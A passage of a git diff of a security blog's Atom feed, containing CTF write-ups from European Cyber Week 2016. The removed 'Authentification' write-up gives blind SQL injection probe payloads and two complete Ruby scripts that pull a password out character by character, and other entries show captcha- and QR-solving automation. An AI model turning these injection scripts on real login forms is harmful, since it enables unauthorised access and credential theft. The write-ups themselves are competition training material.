class="string">"output.gif"</span>)</div><div class="line"></div><div class="line"></div><div class="line">im2.load()</div><div class="line"><span class="keyword">print</span> (image_to_string(im2))</div></pre></td></tr></table></figure>
+<p>Here is my custom QR code solver <code>myQRCodeSolver.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> qrtools</div><div class="line">qr = qrtools.QR()</div><div class="line">qr.decode(<span class="string">"qrcode.png"</span>)</div><div class="line"><span class="keyword">print</span> qr.data</div></pre></td></tr></table></figure>
+<p>Flag: <code>ECW{20cbf8e17eb7e62936e3602b498776e6}</code>.</p>
 ]]></content>
     
     <summary type="html">
@@ -615,11 +757,11 @@
     
       <category term="security" scheme="http://rawsec.ml/tags/security/"/>
     
-      <category term="crypto" scheme="http://rawsec.ml/tags/crypto/"/>
-    
       <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
     
       <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
+    
+      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
     
   </entry>
   
@@ -759,150 +901,6 @@
   </entry>
   
   <entry>
-    <title>ECW - 150 - Alternative Persistent Threat - Forensics</title>
-    <link href="http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/"/>
-    <id>http://rawsec.ml/en/ECW-2016-Alternative-Persistent-Threat/</id>
-    <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:44:43.303Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
-<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy - Student</li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>We used <a href="http://www.arxsys.fr/discover/" target="_blank" rel="external">Digital Forensics Framework (DFF)</a></p>
-<p>We can view that <strong>usb.dd</strong> is NTFS partition in the hex view so we mounted it as it.</p>
-<p>We browsed the files and this one retaind our attention: <code>usb.dd/NTFS/Users/windows/Documents/tmp_rqsu78.docx:flag</code>.</p>
-<p>Its content is:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;Get the data from the default value of the key HKLM\SYSTEM\CurrentControlSet\Control\DeviceContainers\&#123;000001111-2345178-232416-99801&#125;&apos;</div></pre></td></tr></table></figure>
-<p>So we need to find Windows registry and browse it.</p>
-<blockquote>
-<p>The location of these registry hives are as follows:<br><code>HKEY_LOCAL_MACHINE \SYSTEM</code> : <code>\system32\config\system</code></p>
-</blockquote>
-<p>Source: <a href="http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7" target="_blank" rel="external">http://www.thewindowsclub.com/where-are-the-windows-registry-files-located-in-windows-7</a></p>
-<p>We browsed it and the value of the key was: <code>a2486aac827711258d0642176cc4f8c2</code>.</p>
-<p>So the flag is <code>ECW{a2486aac827711258d0642176cc4f8c2}</code>.</p>
-<p><strong>Bonus</strong>:</p>
-<ul>
-<li><code>/Logical files/temp/usb.dd/NTFS/!j3CtfuSD5zz1RfB=MlsL]u-k8O5v+,P</code> was certainly the target location of the attack.</li>
-<li>There was also a <code>no flag here.txt</code> troll file in <code>Windows\system32\config\</code> containing a pretty list of fake flags:</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">ECW&#123;ee4f493d149e634540b79ed030b3790e&#125;</div><div class="line">ECW&#123;ef20996f87a1c172223d1796f155cabb&#125;</div><div class="line">ECW&#123;78a4b8dd2614fea24d694aaad4e5ee7c&#125;</div><div class="line">ECW&#123;2942e64a0b3836b84aa18311be73804d&#125;</div><div class="line">ECW&#123;860d8070c9fed931856856b2957316d9&#125;</div><div class="line">ECW&#123;5c07ee2b8313b406a32325c7a2924011&#125;</div><div class="line">ECW&#123;20b1ab287f9f4485800b15ba9cb933b0&#125;</div><div class="line">ECW&#123;31470d8d9676ee5d17fe79317124d67a&#125;</div><div class="line">ECW&#123;c0ad5adadd6dc5871f4cc66370757d9a&#125;</div><div class="line">ECW&#123;d28aeba8bb169a6f628d77b7059e9110&#125;</div><div class="line">ECW&#123;c9f619827e73ce3d61048b0ddb49ec84&#125;</div><div class="line">ECW&#123;07c563dd9f91b19a18d8876e89188593&#125;</div><div class="line">ECW&#123;46f8ba8cd62e3334e05501407d653587&#125;</div><div class="line">ECW&#123;d55e0d52fa7c5ccb0af9efa488f5206d&#125;</div><div class="line">ECW&#123;269c20f280f7326c674811f59ece9cab&#125;</div><div class="line">ECW&#123;656122abbb817863ae145539bb0eeb03&#125;</div><div class="line">ECW&#123;d1b46e0fa5e5c0375ade62ff820ce631&#125;</div><div class="line">ECW&#123;62fd1f329ac8d59e6c4052e45b6121bf&#125;</div><div class="line">ECW&#123;c4393a542ae85e178cf7da6cee80139d&#125;</div><div class="line">ECW&#123;0ae1fcf8c1b5e378ba62736d59ab346c&#125;</div><div class="line">ECW&#123;31e42f6a1adeb6350cda9270c164855f&#125;</div><div class="line">ECW&#123;6a1dd34361fe943af6a4c4a71584ac2f&#125;</div><div class="line">ECW&#123;bc65d36be9d0c6877cc0b200002e4e2d&#125;</div><div class="line">ECW&#123;a0a7c3fff21f2aea3cfa1d0316dd816c&#125;</div><div class="line">ECW&#123;4cf2d64e44205fe628ddd534e1151b58&#125;</div><div class="line">ECW&#123;9cc72dc973e24f9623bd3fe708f60ef5&#125;</div><div class="line">ECW&#123;579a3c1e12a1e74a98169175fb913012&#125;</div><div class="line">ECW&#123;2b7ea5cee3c49ff53d41e00785eb974c&#125;</div><div class="line">ECW&#123;a4a7e457b55b5ac2877f7973dbba37e9&#125;</div><div class="line">ECW&#123;01b1688f97f94776baae85d77b06048b&#125;</div><div class="line">ECW&#123;9b64ca5761c6de555d7d1b3c948ecfeb&#125;</div><div class="line">ECW&#123;3ff6ba9cf6d8e5332978e057559b5562&#125;</div><div class="line">ECW&#123;7dfe15854212a30f346da5255c1d794b&#125;</div><div class="line">ECW&#123;f51b02427757e79621b5235d7efdf117&#125;</div><div class="line">ECW&#123;e0e8b9912a4793170fd23f7aa4c6d68c&#125;</div><div class="line">ECW&#123;036208b4a1ab4a235d75c181e685e5a3&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;a51a588dc98a55fbbb26cf2f64589bda&#125;</div><div class="line">ECW&#123;7fad9816d7334cc470e5dc82d06e222f&#125;</div><div class="line">ECW&#123;d69fc8c97d906264c98463b4bca59fd4&#125;</div><div class="line">ECW&#123;5088741fd5456ef3471fe11022575e03&#125;</div><div class="line">ECW&#123;4d3f80683b3b9021f517e5b9920d0126&#125;</div><div class="line">ECW&#123;73a00957034783b7b5c8294c54cd3e12&#125;</div><div class="line">ECW&#123;1f77c389e0a69652980c341170d0834b&#125;</div><div class="line">ECW&#123;b42d4ed9a6bf5cda33366c01be5d11cb&#125;</div><div class="line">ECW&#123;c9440da5b11074fca7966ecde2fe3c97&#125;</div><div class="line">ECW&#123;6258191d167c56dcdb51ae9fa2faee23&#125;</div><div class="line">ECW&#123;095fd6a167e3c0f7331a1a6b97969c83&#125;</div><div class="line">ECW&#123;40942c14fbaaff0523b88ab781900cfd&#125;</div><div class="line">ECW&#123;39e14ad7477262c347f2e6d927a6518c&#125;</div><div class="line">ECW&#123;cdfb31c9bd2ea0c6d87206224466ac75&#125;</div><div class="line">ECW&#123;663f929002e1547fd2bf67e72f1b85e0&#125;</div><div class="line">ECW&#123;2eedce1bca0150e3dcda7e77f4d8ecfd&#125;</div><div class="line">ECW&#123;35b88728559e409dd550eb818228c99e&#125;</div><div class="line">ECW&#123;469966e739df10b55c3c8ee3ad572617&#125;</div><div class="line">ECW&#123;5146da32deef5fee7df9461eeca13e7b&#125;</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-      <category term="forensics" scheme="http://rawsec.ml/tags/forensics/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ECW - 50 - Authentification - Web</title>
-    <link href="http://rawsec.ml/en/ECW-2016-authentification/"/>
-    <id>http://rawsec.ml/en/ECW-2016-authentification/</id>
-    <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:45:01.537Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
-<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
-<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy - Student</li>
-</ul>
-<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Blind_SQL_Injection" target="_blank" rel="external">bling SQL injection</a> and Out-Of-Band (OOB) channel exfiltration is not working.<br>When giving a correct (well formed) SQLi we get the message: <code>Authentification valide. Le mot de passe est le flag.</code>.<br>So we are able to determine if a request is true or false.<br>So the following requests gave us some details about the DB:</p>
-<ul>
-<li><code>&#39; or 1=1 #</code> =&gt; MySQL Database</li>
-<li><code>&#39; or substring(version(),1,1)=5 #</code> =&gt; MySQL 5</li>
-<li><code>&#39; or (select 1)=1 #</code> =&gt; subselect supported</li>
-<li><code>&#39; or (select substring(concat(1,password),1,1) limit 0,1)=1 #</code> =&gt; column name is <em>password</em></li>
-</ul>
-<p>So our payload will be <code>SELECT password</code>.</p>
-<p>And here is the script I wrote :</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line"><span class="comment"># Find the length of the password</span></div><div class="line">length = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> <span class="literal">true</span> <span class="keyword">do</span></div><div class="line">  c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR LENGTH((<span class="subst">#&#123;payload&#125;</span>))=<span class="subst">#&#123;length&#125;</span> #"</span>),</div><div class="line">              Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">  c.perform</div><div class="line">  <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">    puts <span class="string">"Length: <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    <span class="keyword">break</span></div><div class="line">  <span class="keyword">else</span></div><div class="line">    puts <span class="string">"Length: not <span class="subst">#&#123;length&#125;</span>"</span></div><div class="line">    length+=<span class="number">1</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  (<span class="number">32</span>..<span class="number">126</span>).each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char.chr)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char.chr&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
-<p>We can optimize the time to get the password because we know that the flag is <code>ECW{md5(string)}</code> and md5 hashes contains only lower letters and digits that is 32 chars long. So we can fix some parameters:</p>
-<ul>
-<li>Lenght of the password: <strong>37</strong></li>
-<li>Alphabet: <strong>[“a”, “b”, “c”, “d”, “e”, “f”, “0”, “1”, “2”, “3”, “4”, “5”, “6”, “7”, “8”, “9”, “E”, “C”, “W”, “{“, “}”]</strong></li>
-</ul>
-<p>That give us the more optimized script:</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web100'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Veuillez vous authentifier pour r/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment"># Request we want to know the answer</span></div><div class="line">payload = <span class="string">'SELECT password'</span></div><div class="line"></div><div class="line">length = <span class="number">37</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a + [<span class="string">'E'</span>, <span class="string">'C'</span>, <span class="string">'W'</span>, <span class="string">'&#123;'</span>, <span class="string">'&#125;'</span>]</div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password'</span>, <span class="string">"' OR ASCII(SUBSTRING((<span class="subst">#&#123;payload&#125;</span>),<span class="subst">#&#123;offset&#125;</span>,1))=<span class="subst">#&#123;char.ord&#125;</span> #"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: <span class="subst">#&#123;answer&#125;</span>"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: <span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
-<p>So we got the flag: <code>ECW{d3832d5a1ef4c3bef82b87ced5f50e7d}</code>.</p>
-<p><strong>BONUS</strong>: I used my script to get the username:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SELECT user()</div><div class="line">User: ecw@localhost</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
-    
-    </summary>
-    
-      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
-    
-      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
-    
-      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
     <title>ECW - 150 - Carnet d&#39;adresses - Web</title>
     <link href="http://rawsec.ml/en/ECW-2016-carnet-dadresse/"/>
     <id>http://rawsec.ml/en/ECW-2016-carnet-dadresse/</id>
@@ -988,11 +986,11 @@
   </entry>
   
   <entry>
-    <title>ECW - 150 - Dilemme - Misc</title>
-    <link href="http://rawsec.ml/en/ECW-2016-dilemme/"/>
-    <id>http://rawsec.ml/en/ECW-2016-dilemme/</id>
+    <title>ECW - 50 - Ave, César! - Cryptography</title>
+    <link href="http://rawsec.ml/en/ECW-2016-ave-cesar/"/>
+    <id>http://rawsec.ml/en/ECW-2016-ave-cesar/</id>
     <published>2016-11-05T23:00:00.000Z</published>
-    <updated>2016-11-07T21:44:52.883Z</updated>
+    <updated>2016-11-07T21:44:48.247Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
 <thead>
@@ -1017,21 +1015,13 @@
 <li><strong>Format</strong> : Jeopardy - Student</li>
 </ul>
 <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>For this challenge we needed to solve a captcha and a QR code as faster as possible.</p>
-<p>For this I wrote a ruby script:</p>
-<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'base64'</span> <span class="comment"># to decode base64 images</span></div><div class="line"><span class="keyword">require</span> <span class="string">'zxing'</span> <span class="comment"># to solve qr code</span></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line"><span class="comment">### Crawling the website to get the base64 QRCode ###</span></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/divers200'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform</div><div class="line"><span class="comment">#puts c.body_str</span></div><div class="line"></div><div class="line"><span class="comment">### Parse the output ###</span></div><div class="line">qrcode_b64 = c.body_str.match(<span class="regexp">/QRCode" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = c.body_str.match(<span class="regexp">/Captcha" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">captcha_file = <span class="string">'captcha.png'</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : base64 to png ###</span></div><div class="line">File.open(qrcode_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(qrcode_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### Captcha : base64 to png ###</span></div><div class="line">File.open(captcha_file, <span class="string">'wb'</span>) <span class="keyword">do</span> <span class="params">|f|</span></div><div class="line">  f.write(Base64.decode64(captcha_b64))</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="comment">### QRCode : png to text string ###</span></div><div class="line">qrcode_answer = ZXing.decode qrcode_file</div><div class="line">puts <span class="string">'QRCode : '</span>.concat(qrcode_answer)</div><div class="line"></div><div class="line"><span class="comment">### Captcha : png to text string ###</span></div><div class="line">captcha_answer = <span class="string">`python2 myCaptchaSolver.py`</span>.chomp</div><div class="line">puts <span class="string">'Captcha : '</span>.concat(captcha_answer)</div><div class="line"></div><div class="line"><span class="comment">### Send the answer ###</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line">c.http_post(Curl::PostField.content(<span class="string">'captcha'</span>, captcha_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'qrcode'</span>, qrcode_answer),</div><div class="line">            Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">c.perform</div><div class="line">puts c.body_str.match(<span class="regexp">/&lt;center&gt;(.*)&lt;\/center&gt;/</span>).captures[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="comment"># Redo the whole process one more time</span></div><div class="line">qrcode_b64 = c.body_str.match(<span class="regexp">/QRCode Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span class="number">0</span>]</div><div class="line">qrcode_file = <span class="string">'qrcode.png'</span></div><div class="line">captcha_b64 = c.body_str.match(<span class="regexp">/Captcha Win" src="data:image\/png;base64,(.*)" height/</span>).captures[<span 